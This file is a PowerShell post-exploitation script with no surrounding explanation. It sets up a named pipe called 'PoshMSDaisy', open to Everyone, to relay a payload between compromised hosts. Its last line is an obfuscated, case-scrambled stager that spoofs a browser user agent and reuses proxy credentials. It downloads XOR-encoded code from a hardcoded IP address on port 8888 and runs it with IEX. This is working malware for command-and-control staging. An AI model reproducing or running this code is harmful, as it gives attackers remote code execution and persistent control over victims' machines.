$scriptblock = 
{
    param ($Payload)
    $PipeName = "PoshMSDaisy"
    $p = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
    $start = $true
    foreach ($i in $p) {
        if ($i -like "*PoshMSDaisy") {
             $start = $false 
        }
    }
    while ($start) {
        add-Type -assembly "System.Core"
        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)
        $pipe.WaitForConnection(); 

        $pipeReader = new-object System.IO.StreamReader($pipe)
        $pipeWriter = new-object System.IO.StreamWriter($pipe)
        $pipeWriter.AutoFlush = $true
        $pipeWriter.WriteLine($Payload);
 
        $pipeReader.Dispose();
        $pipe.Dispose();
    }
    exit
}
add-Type -assembly "System.Core"

$MaxThreads = 5
$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $MaxThreads)
$RunspacePool.Open()
$Jobs = @()
$Job = [powershell]::Create().AddScript($ScriptBlock).AddArgument($daisypayload)
$Job.RunspacePool = $RunspacePool
$Job.BeginInvoke() | Out-Null

$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMSDaisy");



[SYstEm.NET.SERVIcePoinTMANAgeR]::ExPecT100CoNtINUe = 0;$wC=NEW-ObjEcT SySteM.NET.WeBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadErS.Add('User-Agent',$u);$Wc.PrOxy = [SysteM.Net.WebReQuEst]::DEfaULTWEbPrOxy;$wc.PrOxy.CrEdenTIaLS = [SYstem.NeT.CREdentIAlCacHE]::DeFAUlTNETWoRKCreDEntIALS;$K='09b1a3a174f960a31c3c5e8546ece55b';$I=0;[chaR[]]$b=([Char[]]($wC.DownlOaDStriNG("http://187.228.46.144:8888/index.asp")))|%{$_-bXoR$K[$i++%$k.LENgTH]};IEX ($b-joIn'')

